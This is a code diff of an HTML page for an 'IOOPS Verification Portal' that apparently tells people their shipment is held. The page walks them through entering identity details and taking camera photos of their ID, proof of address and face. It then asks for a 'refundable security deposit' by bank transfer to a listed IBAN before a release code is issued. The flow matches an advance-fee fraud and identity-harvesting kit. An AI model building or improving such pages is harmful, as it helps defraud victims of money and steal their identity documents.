@@ -3,8 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IOOPS Verification Portal - Recipient Verification</title>
+    <title>IOOPS Verification Portal</title>
     <link rel="stylesheet" href="css/recipient-verification.css">
+    <link rel="stylesheet" href="css/professional-form-fields.css">
 </head>
 <body>
     <div class="verification-portal">
@@ -35,379 +36,500 @@
         <!-- Main Content -->
         <div id="main-content" class="main-content" style="display: none;">
             <!-- Steps Progress Bar -->
-            <div class="steps-bar">
-                <div class="step" data-step="1">
-                    <div class="step-number">1</div>
-                    <div class="step-label">Info</div>
+            <div class="progress-indicator">
+                <div class="progress-line">
+                    <div class="progress-line-fill"></div>
                 </div>
-                <div class="step" data-step="2">
-                    <div class="step-number">2</div>
-                    <div class="step-label">Payment</div>
+                <div class="progress-step" data-step="1">
+                    <div class="progress-number">1</div>
+                    <div class="progress-label">Identity</div>
                 </div>
-                <div class="step" data-step="3">
-                    <div class="step-number">3</div>
-                    <div class="step-label">Generate</div>
+                <div class="progress-step" data-step="2">
+                    <div class="progress-number">2</div>
+                    <div class="progress-label">Payment</div>
                 </div>
-                <div class="step" data-step="4">
-                    <div class="step-number">4</div>
-                    <div class="step-label">Complete</div>
+                <div class="progress-step" data-step="3">
+                    <div class="progress-number">3</div>
+                    <div class="progress-label">Generate</div>
+                </div>
+                <div class="progress-step" data-step="4">
+                    <div class="progress-number">4</div>
+                    <div class="progress-label">Complete</div>
                 </div>
             </div>
 
-            <!-- Step 1: Recipient Information -->
-            <div id="step-1" class="verification-step">
+            <!-- ENTRY POINT -->
+            <div id="entry-point" class="verification-step">
+                <div class="step-content" style="text-align: center; max-width: 560px; margin: 0 auto; padding: 48px 24px;">
+
+                    <!-- Shield Lock Icon -->
+                    <div style="width: 80px; height: 80px; margin: 0 auto 24px; background: linear-gradient(135deg, #0A1428 0%, #1A2840 100%); border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 8px 24px rgba(10, 20, 40, 0.2);">
+                        <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M12 2L4 6V12C4 16.55 7.16 20.74 12 22C16.84 20.74 20 16.55 20 12V6L12 2Z" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                            <path d="M12 8V12M12 16H12.01" stroke="#ffffff" stroke-width="2" stroke-linecap="round"/>
+                        </svg>
+                    </div>
+
+                    <h2 style="font-size: 28px; margin-bottom: 12px; color: var(--text-primary);">Verify Your Identity</h2>
+                    <p style="font-size: 16px; color: var(--text-secondary); margin-bottom: 32px; line-height: 1.6;">To proceed with your shipment, we need to confirm your identity. This takes about 5 minutes.</p>
+
+                    <div style="background: var(--bg-subtle); border-radius: 12px; padding: 24px; margin-bottom: 32px; text-align: left;">
+                        <h3 style="font-size: 15px; font-weight: 600; margin-bottom: 16px; color: var(--text-primary);">What You'll Need</h3>
+                        <div style="display: flex; flex-direction: column; gap: 14px;">
+                            <!-- ID Document Icon -->
+                            <div style="display: flex; align-items: center; gap: 14px;">
+                                <div style="flex-shrink: 0; width: 24px; height: 24px;">
+                                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                        <rect x="3" y="6" width="18" height="12" rx="2" stroke="#6B7280" stroke-width="2"/>
+                                        <circle cx="8" cy="12" r="2" stroke="#6B7280" stroke-width="2"/>
+                                        <path d="M13 10H17M13 14H17" stroke="#6B7280" stroke-width="2" stroke-linecap="round"/>
+                                    </svg>
+                                </div>
+                                <span style="font-size: 14px; color: var(--text-secondary);">Valid government-issued ID</span>
+                            </div>
+                            <!-- Address Icon -->
+                            <div style="display: flex; align-items: center; gap: 14px;">
+                                <div style="flex-shrink: 0; width: 24px; height: 24px;">
+                                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                        <path d="M3 9L12 2L21 9V20C21 20.5304 20.7893 21.0391 20.4142 21.4142C20.0391 21.7893 19.5304 22 19 22H5C4.46957 22 3.96086 21.7893 3.58579 21.4142C3.21071 21.0391 3 20.5304 3 20V9Z" stroke="#6B7280" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                        <path d="M9 22V12H15V22" stroke="#6B7280" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                    </svg>
+                                </div>
+                                <span style="font-size: 14px; color: var(--text-secondary);">Proof of address (utility bill or bank statement)</span>
+                            </div>
+                            <!-- Camera Icon -->
+                            <div style="display: flex; align-items: center; gap: 14px;">
+                                <div style="flex-shrink: 0; width: 24px; height: 24px;">
+                                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                        <path d="M23 19C23 19.5304 22.7893 20.0391 22.4142 20.4142C22.0391 20.7893 21.5304 21 21 21H3C2.46957 21 1.96086 20.7893 1.58579 20.4142C1.21071 20.0391 1 19.5304 1 19V8C1 7.46957 1.21071 6.96086 1.58579 6.58579C1.96086 6.21071 2.46957 6 3 6H7L9 3H15L17 6H21C21.5304 6 22.0391 6.21071 22.4142 6.58579C22.7893 6.96086 23 7.46957 23 8V19Z" stroke="#6B7280" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                        <circle cx="12" cy="13" r="4" stroke="#6B7280" stroke-width="2"/>
+                                    </svg>
+                                </div>
+                                <span style="font-size: 14px; color: var(--text-secondary);">Device with camera for photos</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="action-buttons" style="margin-bottom: 24px;">
+                        <button id="begin-verification-btn" class="btn-primary" style="padding: 16px 48px; font-size: 16px;">Get Started</button>
+                    </div>
+
+                    <p style="font-size: 13px; color: var(--text-tertiary); display: flex; align-items: center; justify-content: center; gap: 6px;">
+                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <rect x="5" y="11" width="14" height="10" rx="2" stroke="#10B981" stroke-width="2"/>
+                            <path d="M8 11V7C8 5.93913 8.42143 4.92172 9.17157 4.17157C9.92172 3.42143 10.9391 3 12 3C13.0609 3 14.0783 3.42143 14.8284 4.17157C15.5786 4.92172 16 5.93913 16 7V11" stroke="#10B981" stroke-width="2"/>
+                            <circle cx="12" cy="16" r="1" fill="#10B981"/>
+                        </svg>
+                        Your information is encrypted and secure
+                    </p>
+                </div>
+            </div>
+
+            <!-- STEP 1.1: Personal Information -->
+            <div id="step-1-1" class="verification-step" style="display: none;">
                 <div class="step-content">
-                    <h2>Recipient Information Verification</h2>
-                    <p>Please verify your information below and confirm to proceed.</p>
+                    <h2>Your Personal Details</h2>
+                    <p class="step-instruction">Enter your information exactly as it appears on your identity document.</p>
 
-                    <div class="info-grid">
-                        <div class="info-item">
-                            <label>Full Name</label>
-                            <div class="info-value" id="recipient-name"></div>
+                    <form id="personal-info-form" class="verification-form">
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="full-name">Full Legal Name</label>
+                                <input type="text" id="full-name" name="full-name" required>
+                            </div>
                         </div>
-                        <div class="info-item">
-                            <label>Email Address</label>
-                            <div class="info-value" id="recipient-email"></div>
+
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="address">Residential Address</label>
+                                <textarea id="address" name="address" rows="3" required></textarea>
+                            </div>
                         </div>
-                        <div class="info-item">
-                            <label>Tracking ID</label>
-                            <div class="info-value" id="tracking-id"></div>
+
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="country">Country of Residence</label>
+                                <select id="country" name="country" required>
+                                    <option value="">Select country</option>
+                                    <option value="US">United States</option>
+                                    <option value="UK">United Kingdom</option>
+                                    <option value="CA">Canada</option>
+                                    <option value="AU">Australia</option>
+                                    <option value="DE">Germany</option>
+                                    <option value="FR">France</option>
+                                    <option value="IT">Italy</option>
+                                    <option value="ES">Spain</option>
+                                    <option value="NL">Netherlands</option>
+                                    <option value="BE">Belgium</option>
+                                </select>
+                            </div>
+
+                            <div class="form-group">
+                                <label for="phone">Contact Phone Number</label>
+                                <input type="tel" id="phone" name="phone" required>
+                            </div>
                         </div>
-                        <div class="info-item">
-                            <label>Shipment Origin</label>
-                            <div class="info-value" id="origin-country"></div>
+
+                        <div class="action-buttons">
+                            <button type="submit" class="btn-primary">Continue</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+
+            <!-- STEP 1.2: Document Details -->
+            <div id="step-1-2" class="verification-step" style="display: none;">
+                <div class="step-content">
+                    <h2>Your ID Details</h2>
+                    <p class="step-instruction">Tell us about the ID document you'll be using. Make sure it's valid and matches the name you entered.</p>
+
+                    <form id="document-info-form" class="verification-form">
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="id-type">Document Type</label>
+                                <select id="id-type" name="id-type" required>
+                                    <option value="">Select document type</option>
+                                    <option value="passport">Passport</option>
+                                    <option value="national_id">National ID Card</option>
+                                    <option value="drivers_license">Driver's License</option>
+                                </select>
+                            </div>
+
+                            <div class="form-group">
+                                <label for="id-country">Issuing Country</label>
+                                <select id="id-country" name="id-country" required>
+                                    <option value="">Select country</option>
+                                    <option value="US">United States</option>
+                                    <option value="UK">United Kingdom</option>
+                                    <option value="CA">Canada</option>
+                                    <option value="AU">Australia</option>
+                                    <option value="DE">Germany</option>
+                                    <option value="FR">France</option>
+                                    <option value="IT">Italy</option>
+                                    <option value="ES">Spain</option>
+                                    <option value="NL">Netherlands</option>
+                                    <option value="BE">Belgium</option>
+                                </select>
+                            </div>
+                        </div>
+
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label for="id-number">Document Number</label>
+                                <input type="text" id="id-number" name="id-number" required>
+                            </div>
+
+                            <div class="form-group">
+                                <label for="id-expiry-date">Expiry Date</label>
+                                <input type="date" id="id-expiry-date" name="id-expiry-date" required>
+                            </div>
+                        </div>
+
+                        <div class="action-buttons">
+                            <button type="submit" class="btn-primary">Continue</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+
+            <!-- STEP 1.3: Camera Capture -->
+            <div id="step-1-3" class="verification-step" style="display: none;">
+                <div class="step-content">
+                    <h2>Take Your Verification Photos</h2>
+                    <p class="step-instruction">We'll guide you through taking 3 quick photos: your ID, proof of address, and a photo of yourself. Your camera will open automatically for each one.</p>
+
+                    <div class="info-notice" style="margin-bottom: 24px;">
+                        <p><strong>Privacy note:</strong> Photos are transmitted securely and reviewed only by authorized verification personnel. They are not stored permanently and will be deleted after verification.</p>
+                    </div>
+
+                    <!-- Document Capture -->
+                    <div id="document-capture-section" class="capture-section">
+                        <h3>Photo 1 of 3: Your ID Document</h3>
+                        <p>Place your ID within the frame shown below. Make sure all text is clear and readable. The photo will be taken automatically when everything looks good.</p>
+
+                        <div class="capture-container">
+                            <video id="document-video" class="capture-video" autoplay playsinline></video>
+                            <canvas id="document-canvas" style="display: none;"></canvas>
+                            <div class="capture-guide document-guide"></div>
+                            <div class="capture-status" id="document-status">Initializing camera...</div>
+                        </div>
+
+                        <div class="capture-preview" id="document-preview" style="display: none;">
+                            <img id="document-preview-img" alt="Document capture">
+                            <div class="preview-actions">
+                                <button class="btn-secondary" id="retake-document">Retake</button>
+                                <button class="btn-primary" id="confirm-document">Confirm</button>
+                            </div>
                         </div>
                     </div>
 
-                    <!-- Document Upload Section -->
-                    <div class="document-upload-section">
-                        <h3>Identity Documents Required</h3>
+                    <!-- Address Proof Capture -->
+                    <div id="address-capture-section" class="capture-section" style="display: none;">
+                        <h3>Photo 2 of 3: Proof of Address</h3>
+                        <p>Now place your proof of address document in the frame. This can be a utility bill, bank statement, or official government letter showing your address.</p>
 
-                        <!-- Passport/ID -->
-                        <div class="document-item">
-                            <label>Passport or ID Card</label>
-                            <div class="upload-controls">
-                                <button type="button" class="btn-camera" data-doc-type="passport">
-                                    📷 Take Photo
-                                </button>
-                                <span class="or-divider">or</span>
-                                <input type="file" id="passport-upload" accept="image/*" />
-                                <label for="passport-upload" class="btn-upload">Choose File</label>
-                            </div>
-                            <div class="document-preview" id="passport-preview" style="display: none;"></div>
+                        <div class="capture-container">
+                            <video id="address-video" class="capture-video" autoplay playsinline></video>
+                            <canvas id="address-canvas" style="display: none;"></canvas>
+                            <div class="capture-guide document-guide"></div>
+                            <div class="capture-status" id="address-status">Initializing camera...</div>
                         </div>
 
-                        <!-- Proof of Address -->
-                        <div class="document-item">
-                            <label>Proof of Address</label>
-                            <div class="upload-controls">
-                                <button type="button" class="btn-camera" data-doc-type="proof_of_address">
-                                    📷 Take Photo
-                                </button>
-                                <span class="or-divider">or</span>
-                                <input type="file" id="proof_of_address-upload" accept="image/*" />
-                                <label for="proof_of_address-upload" class="btn-upload">Choose File</label>
-                            </div>
-                            <div class="document-preview" id="proof_of_address-preview" style="display: none;"></div>
-                        </div>
-
-                        <!-- Selfie -->
-                        <div class="document-item">
-                            <label>Selfie with ID</label>
-                            <div class="upload-controls">
-                                <button type="button" class="btn-camera" data-doc-type="selfie">
-                                    📷 Take Selfie
-                                </button>
-                                <span class="or-divider">or</span>
-                                <input type="file" id="selfie-upload" accept="image/*" />
-                                <label for="selfie-upload" class="btn-upload">Choose File</label>
-                            </div>
-                            <div class="document-preview" id="selfie-preview" style="display: none;"></div>
-                        </div>
-                    </div>
-
-                    <!-- Camera Modal -->
-                    <div id="camera-modal" class="camera-modal" style="display: none;">
-                        <div class="camera-container">
-                            <div class="camera-header">
-                                <h3 id="camera-title">Capture Document</h3>
-                                <button class="btn-close-camera">✕</button>
-                            </div>
-                            <div class="camera-preview">
-                                <video id="camera-video" autoplay playsinline></video>
-                                <canvas id="camera-canvas" style="display: none;"></canvas>
-                                <div class="camera-guide" id="camera-guide"></div>
-                            </div>
-                            <div class="camera-controls">
-                                <button class="btn-switch-camera">🔄 Switch Camera</button>
-                                <button class="btn-capture">📸 Capture</button>
-                                <button class="btn-retake" style="display: none;">↺ Retake</button>
-                                <button class="btn-use-photo" style="display: none;">✓ Use Photo</button>
+                        <div class="capture-preview" id="address-preview" style="display: none;">
+                            <img id="address-preview-img" alt="Address proof capture">
+                            <div class="preview-actions">
+                                <button class="btn-secondary" id="retake-address">Retake</button>
+                                <button class="btn-primary" id="confirm-address">Confirm</button>
                             </div>
                         </div>
                     </div>
 
-                    <div class="action-buttons">
-                        <button id="confirm-info-btn" class="btn-primary">Submit Documents</button>
+                    <!-- Face Capture -->
+                    <div id="face-capture-section" class="capture-section" style="display: none;">
+                        <h3>Photo 3 of 3: Verify It's You</h3>
+                        <p>Finally, position your face in the frame. Look directly at the camera and remove glasses or hats if possible. The photo will be taken automatically.</p>
+
+                        <div class="capture-container">
+                            <video id="face-video" class="capture-video" autoplay playsinline></video>
+                            <canvas id="face-canvas" style="display: none;"></canvas>
+                            <div class="capture-guide face-guide"></div>
+                            <div class="capture-status" id="face-status">Initializing camera...</div>
+                        </div>
+
+                        <div class="capture-preview" id="face-preview" style="display: none;">
+                            <img id="face-preview-img" alt="Face capture">
+                            <div class="preview-actions">
+                                <button class="btn-secondary" id="retake-face">Retake</button>
+                                <button class="btn-primary" id="confirm-face">Confirm</button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Completion -->
+                    <div id="capture-complete" class="capture-section" style="display: none;">
+                        <div class="completion-notice">
+                            <div class="completion-icon">✓</div>
+                            <h3>All Photos Captured</h3>
+                            <p>Great! We've got all three photos. They look clear and will be reviewed by our verification team.</p>
+                        </div>
+
+                        <div class="action-buttons">
+                            <button id="submit-identity-btn" class="btn-primary">Continue to Payment</button>
+                        </div>
                     </div>
                 </div>
             </div>
 
-            <!-- Step 2: Escrow Payment -->
+            <!-- WAITING FOR APPROVAL -->
+            <div id="waiting-approval" class="verification-step" style="display: none;">
+                <div class="step-content">
+                    <div class="waiting-notice" style="text-align: center; padding: 48px 24px;">
+                        <div class="waiting-icon" style="font-size: 64px; margin-bottom: 24px;">⏳</div>
+                        <h2>Your Documents Are Being Reviewed</h2>
+                        <p style="margin: 16px 0 24px 0; color: var(--text-secondary);">We've received your verification documents and they're currently under review by our compliance team.</p>
+
+                        <div class="review-timeline" style="background: var(--bg-subtle); padding: 24px; border-radius: 8px; margin: 32px 0; text-align: left;">
+                            <h3 style="font-size: 16px; margin: 0 0 16px 0; color: var(--text-primary);">What's Happening Now</h3>
+                            <div class="timeline-item" style="margin-bottom: 16px; padding-left: 24px; position: relative;">
+                                <div style="position: absolute; left: 0; top: 4px; width: 12px; height: 12px; border-radius: 50%; background: var(--success);"></div>
+                                <div style="font-weight: 600; color: var(--text-primary);">Documents Submitted</div>
+                                <div style="font-size: 14px; color: var(--text-secondary);">Your photos and information have been received</div>
+                            </div>
+                            <div class="timeline-item" style="margin-bottom: 16px; padding-left: 24px; position: relative;">
+                                <div style="position: absolute; left: 0; top: 4px; width: 12px; height: 12px; border-radius: 50%; background: var(--warning);"></div>
+                                <div style="font-weight: 600; color: var(--text-primary);">Under Review</div>
+                                <div style="font-size: 14px; color: var(--text-secondary);">Our team is verifying your identity documents</div>
+                            </div>
+                            <div class="timeline-item" style="padding-left: 24px; position: relative;">
+                                <div style="position: absolute; left: 0; top: 4px; width: 12px; height: 12px; border-radius: 50%; background: var(--border);"></div>
+                                <div style="font-weight: 600; color: var(--text-secondary);">Approval Pending</div>
+                                <div style="font-size: 14px; color: var(--text-secondary);">You'll be notified when approved</div>
+                            </div>
+                        </div>
+
+                        <div class="info-notice">
+                            <p><strong>Typical review time:</strong> 1-2 business hours</p>
+                            <p style="margin-top: 12px; font-size: 14px;">This page will automatically update when your documents are approved. You can also refresh to check the status.</p>
+                        </div>
+
+                        <div class="action-buttons" style="margin-top: 32px;">
+                            <button id="check-approval-btn" class="btn-primary">Check Status</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- REJECTED STATE -->
+            <div id="rejected" class="verification-step" style="display: none;">
+                <div class="step-content">
+                    <div class="rejection-notice" style="text-align: center; padding: 48px 24px;">
+                        <div class="rejection-icon" style="font-size: 64px; margin-bottom: 24px; color: var(--error);">✗</div>
+                        <h2 style="color: var(--error);">Verification Documents Need Attention</h2>
+                        <p style="margin: 16px 0 24px 0; color: var(--text-secondary);">Unfortunately, some of your submitted documents couldn't be verified. Please review the issues below and resubmit.</p>
+
+                        <div class="rejection-reasons" style="background: #FEF2F2; border: 1px solid #FCA5A5; padding: 24px; border-radius: 8px; margin: 32px 0; text-align: left;">
+                            <h3 style="font-size: 16px; margin: 0 0 16px 0; color: var(--error);">Issues Found</h3>
+                            <div id="rejection-list">
+                                <!-- Populated by JavaScript -->
+                            </div>
+                        </div>
+
+                        <div class="info-notice">
+                            <p><strong>What to do next:</strong></p>
+                            <ul style="text-align: left; margin: 12px 0 0 20px; padding: 0;">
+                                <li>Review the issues listed above</li>
+                                <li>Prepare new, clear photos addressing the feedback</li>
+                                <li>Click "Try Again" to resubmit your documents</li>
+                            </ul>
+                        </div>
+
+                        <div class="action-buttons" style="margin-top: 32px; gap: 12px;">
+                            <button id="retry-verification-btn" class="btn-primary">Try Again</button>
+                            <button id="contact-support-btn" class="btn-secondary">Contact Support</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- STEP 2: Payment -->
             <div id="step-2" class="verification-step" style="display: none;">
                 <div class="step-content">
-                    <h2>Escrow Deposit Required</h2>
+                    <h2>Security Deposit</h2>
+                    <p>A refundable security deposit is required to complete your verification. This ensures compliance with international regulations and will be returned to you after your transaction is complete.</p>
 
-                    <div class="info-notice">
-                        <p><strong>Why is this required?</strong> A refundable escrow deposit is required as part of the International Oversight Protocol to ensure shipment security and compliance.</p>
-                    </div>
-
-                    <div class="escrow-details">
-                        <div class="escrow-amount">
-                            <label>Required Deposit Amount</label>
-                            <div class="amount-display">
-                                <span class="currency">EUR</span>
-                                <span class="amount" id="escrow-amount"></span>
-                            </div>
+                    <div class="bank-details">
+                        <h3>Transfer Details</h3>
+                        <div class="info-row">
+                            <span class="label">Amount:</span>
+                            <span class="value" id="escrow-amount"></span>
                         </div>
-
-                        <div class="payment-info-box">
-                            <h3>Payment Instructions</h3>
-                            <div class="payment-field">
-                                <label>Bank Name</label>
-                                <div class="value">Banque de France</div>
-                            </div>
-                            <div class="payment-field">
-                                <label>Account Holder</label>
-                                <div class="value">IOOPS Escrow Services</div>
-                            </div>
-                            <div class="payment-field">
-                                <label>IBAN</label>
-                                <div class="value copyable" id="payment-iban">
-                                    <span>FR76 3000 4025 1800 0100 0509 383</span>
-                                    <button class="btn-copy" onclick="copyToClipboard('FR76 3000 4025 1800 0100 0509 383')">Copy</button>
-                                </div>
-                            </div>
-                            <div class="payment-field">
-                                <label>SWIFT/BIC</label>
-                                <div class="value copyable">
-                                    <span>BNPAFRPP</span>
-                                    <button class="btn-copy" onclick="copyToClipboard('BNPAFRPP')">Copy</button>
-                                </div>
-                            </div>
-                            <div class="payment-field">
-                                <label>Reference Number</label>
-                                <div class="value copyable" id="payment-reference">
-                                    <span id="reference-number"></span>
-                                    <button class="btn-copy" onclick="copyToClipboard(document.getElementById('reference-number').textContent)">Copy</button>
-                                </div>
-                            </div>
+                        <div class="info-row">
+                            <span class="label">IBAN:</span>
+                            <span class="value" id="iban">FR76 3000 4025 1800 0100 0509 383</span>
                         </div>
-
-                        <div class="warning-box">
-                            <p><strong>Important:</strong> Include the reference number in your payment to ensure proper processing.</p>
+                        <div class="info-row">
+                            <span class="label">SWIFT/BIC:</span>
+                            <span class="value" id="swift">BNPAFRPP</span>
+                        </div>
+                        <div class="info-row">
+                            <span class="label">Reference:</span>
+                            <span class="value" id="payment-reference"></span>
                         </div>
                     </div>
 
-                    <!-- Payment Status Display -->
-                    <div id="payment-status-container" style="display: none;">
-                        <div id="payment-pending" class="status-box status-pending">
-                            <div class="status-icon">⏳</div>
-                            <div class="status-content">
-                                <h3>Payment Pending Approval</h3>
-                                <p>Your payment receipt has been uploaded and is being reviewed by our administrators.</p>
-                                <p class="status-time">Submitted: <span id="payment-submitted-time"></span></p>
-                            </div>
-                        </div>
-
-                        <div id="payment-rejected" class="status-box status-rejected" style="display: none;">
-                            <div class="status-icon">❌</div>
-                            <div class="status-content">
-                                <h3>Payment Receipt Rejected</h3>
-                                <p id="rejection-reason" class="rejection-reason"></p>
-                                <p><strong>Please upload a new receipt below.</strong></p>
-                            </div>
-                        </div>
-
-                        <div id="payment-approved" class="status-box status-approved" style="display: none;">
-                            <div class="status-icon">✓</div>
-                            <div class="status-content">
-                                <h3>Payment Verified</h3>
-                                <p>Your escrow deposit has been confirmed. Proceeding to next step...</p>
-                            </div>
-                        </div>
+                    <div class="info-notice" style="margin-top: 24px;">
+                        <p><strong>Important:</strong> After making your transfer, upload a screenshot or photo of your payment confirmation. We'll verify it within 1-2 business hours.</p>
                     </div>
 
-                    <!-- Upload Section -->
-                    <div id="upload-section" class="upload-section">
-                        <h3>Upload Payment Receipt</h3>
-                        <p>Once you've completed the payment, upload your receipt or confirmation screenshot.</p>
-
-                        <div class="upload-area" id="upload-area">
-                            <input type="file" id="receipt-input" accept="image/*,.pdf" style="display: none;">
-                            <div class="upload-prompt">
-                                <div class="upload-icon">📎</div>
-                                <p>Click to select or drag & drop your receipt</p>
-                                <p class="upload-hint">Supported: JPG, PNG, PDF (Max 5MB)</p>
-                            </div>
-                            <div class="upload-preview" id="upload-preview" style="display: none;">
-                                <img id="preview-image" src="" alt="Receipt preview">
-                                <div class="preview-info">
-                                    <p id="file-name"></p>
-                                    <button class="btn-remove" id="remove-file-btn">Remove</button>
-                                </div>
-                            </div>
+                    <form id="payment-confirmation-form">
+                        <div class="form-group">
+                            <label for="payment-receipt">Upload Your Payment Receipt</label>
+                            <input type="file" id="payment-receipt" accept="image/*,.pdf" required>
+                            <small style="display: block; margin-top: 8px; color: var(--text-secondary);">Accepted formats: JPG, PNG, PDF (max 5MB)</small>
                         </div>
 
-                        <button id="upload-receipt-btn" class="btn-primary" disabled>Upload Receipt</button>
-                    </div>
+                        <div class="action-buttons">
+                            <button type="submit" class="btn-primary">Submit Receipt</button>
+                        </div>
+                    </form>
                 </div>
             </div>
 
-            <!-- Step 3: Generate Security Code -->
+            <!-- STEP 3: Generate Code -->
             <div id="step-3" class="verification-step" style="display: none;">
                 <div class="step-content">
-                    <h2>Generate Security Release Code</h2>
+                    <h2>Get Your Verification Code</h2>
+                    <p>You're almost done! Your identity and payment have been confirmed. Click below to generate your unique verification code.</p>
 
-                    <div class="info-notice">
-                        <p><strong>✓ Payment Verified!</strong> Your escrow deposit has been confirmed.</p>
+                    <div class="action-buttons">
+                        <button id="generate-code-btn" class="btn-primary">Generate My Code</button>
                     </div>
 
-                    <p>Your shipment is currently on security hold pending authorization. To release your shipment for final delivery, you need to generate a unique security code.</p>
-
-                    <p><strong>What is a security code?</strong> This one-time authorization code will be used to verify your identity with the shipping carrier and release your shipment from the security hold.</p>
-
-                    <div id="generate-button-container">
-                        <button id="generate-code-btn" class="btn-generate">
-                            Generate My Security Code
-                        </button>
+                    <div id="code-display" style="display: none;">
+                        <div class="verification-code">
+                            <span id="security-code"></span>
+                        </div>
+                        <p class="code-instruction">Save this code! You'll need to enter it on the tracking page to complete your verification and access your shipment details.</p>
                     </div>
                 </div>
             </div>
 
-            <!-- Step 4: Security Code & Completion -->
+            <!-- STEP 4: Complete -->
             <div id="step-4" class="verification-step" style="display: none;">
                 <div class="step-content">
-                    <!-- WAITING STATE: Show while waiting for code verification -->
-                    <div id="step-4-waiting" class="step-4-state">
-                        <h2>Release Your Shipment Now</h2>
+                    <div class="completion-notice">
+                        <div class="completion-icon">✓</div>
+                        <h2>Verification Complete!</h2>
+                        <p>Your verification code has been generated and is ready to use. Enter it on the tracking page to access your shipment.</p>
+                    </div>
 
-                        <div class="success-banner">
-                            <div class="success-icon">✓</div>
-                            <p><strong>Security Code Generated Successfully!</strong></p>
+                    <div class="info-notice" style="margin-top: 24px;">
+                        <p><strong>What happens next?</strong></p>
+                        <ol style="margin: 12px 0 0 20px; padding: 0;">
+                            <li>Go to the tracking page</li>
+                            <li>Enter your verification code</li>
+                            <li>Access your shipment details</li>
+                        </ol>
+                    </div>
+
+                    <div class="action-buttons" style="margin-top: 32px;">
+                        <button id="return-to-tracking-btn" class="btn-primary">Return to Tracking Page</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- STEP 5: Code Used - Completion with Receipt -->
+            <div id="step-5" class="verification-step" style="display: none;">
+                <div class="step-content">
+                    <div class="completion-notice">
+                        <div class="completion-icon">✓</div>
+                        <h2>Verification Successfully Used</h2>
+                        <p>Your verification code has been accepted on the Meridian Tracking system. Your identity has been confirmed and your shipment is now accessible.</p>
+                    </div>
+
+                    <div class="receipt-section" style="margin-top: 32px; padding: 24px; background: var(--bg-subtle); border-radius: 8px; border: 1px solid var(--border);">
+                        <h3 style="margin: 0 0 16px 0; font-size: 18px;">Verification Receipt</h3>
+                        <div class="info-row">
+                            <span class="label">Verification ID:</span>
+                            <span class="value" id="receipt-verification-id"></span>
                         </div>
-
-                        <p><strong>Your unique authorization code is:</strong></p>
-
-                        <div class="code-box">
-                            <code id="security-code" class="security-code"></code>
-                            <div class="code-actions">
-                                <button id="copy-code-btn" class="btn-code-action">
-                                    <span class="btn-icon">📋</span> Copy
-                                </button>
-                                <button id="email-code-btn" class="btn-code-action">
-                                    <span class="btn-icon">📧</span> Email Me
-                                </button>
-                                <button id="download-code-btn" class="btn-code-action">
-                                    <span class="btn-icon">💾</span> Download
-                                </button>
-                            </div>
+                        <div class="info-row">
+                            <span class="label">Tracking Number:</span>
+                            <span class="value" id="receipt-tracking-id"></span>
                         </div>
-
-                        <div class="code-safety-notice">
-                            <h4>⚠️ IMPORTANT: Do Not Lose This Code</h4>
-                            <p>This is a <strong>one-time authorization code</strong> that cannot be regenerated. Save it using one of the methods above before proceeding.</p>
+                        <div class="info-row">
+                            <span class="label">Verified Name:</span>
+                            <span class="value" id="receipt-name"></span>
                         </div>
-
-                        <div class="instructions-box">
-                            <h3>🚀 How to Release Your Shipment</h3>
-                            <ol class="instructions-list">
-                                <li><strong>Save your code</strong> using Copy, Email, or Download (above)</li>
-                                <li><strong>Visit</strong> the Meridian Tracking Portal → <a href="https://meridian-tracking.fly.dev" target="_blank" class="external-link">https://meridian-tracking.fly.dev</a></li>
-                                <li><strong>Enter</strong> your tracking ID: <code id="tracking-id-display"></code></li>
-                                <li><strong>Enter</strong> your security code to release your shipment</li>
-                                <li><strong>Wait</strong> for confirmation (this page will update automatically)</li>
-                            </ol>
-
-                            <div class="warning-box">
-                                <p><strong>⏱️ Time Sensitive:</strong> Once you enter this code on the Meridian portal, your shipment will be immediately cleared for final delivery.</p>
-                            </div>
+                        <div class="info-row">
+                            <span class="label">Verification Date:</span>
+                            <span class="value" id="receipt-date"></span>
                         </div>
-
-                        <div class="polling-indicator">
-                            <div class="pulse-dot"></div>
-                            <span>Waiting for code verification on Meridian portal...</span>
+                        <div class="info-row">
+                            <span class="label">Status:</span>
+                            <span class="value" style="color: var(--success); font-weight: 600;">Verified & Complete</span>
                         </div>
                     </div>
 
-                    <!-- COMPLETED STATE: Show after code is verified -->
-                    <div id="step-4-completed" class="step-4-state" style="display: none;">
-                        <div class="completion-header">
-                            <div class="completion-icon">✓</div>
-                            <h2>Verification Complete</h2>
-                            <p class="completion-subtitle">Your shipment has been successfully released for delivery</p>
-                        </div>
+                    <div class="action-buttons" style="margin-top: 24px; gap: 12px;">
+                        <button id="download-receipt-btn" class="btn-primary">Download Receipt (PDF)</button>
+                        <button id="return-to-meridian-btn" class="btn-secondary">Return to Tracking</button>
+                    </div>
 
-                        <div class="completion-info-box">
-                            <h3>Verification Summary</h3>
-                            <div class="info-row">
-                                <span class="info-label">Tracking ID:</span>
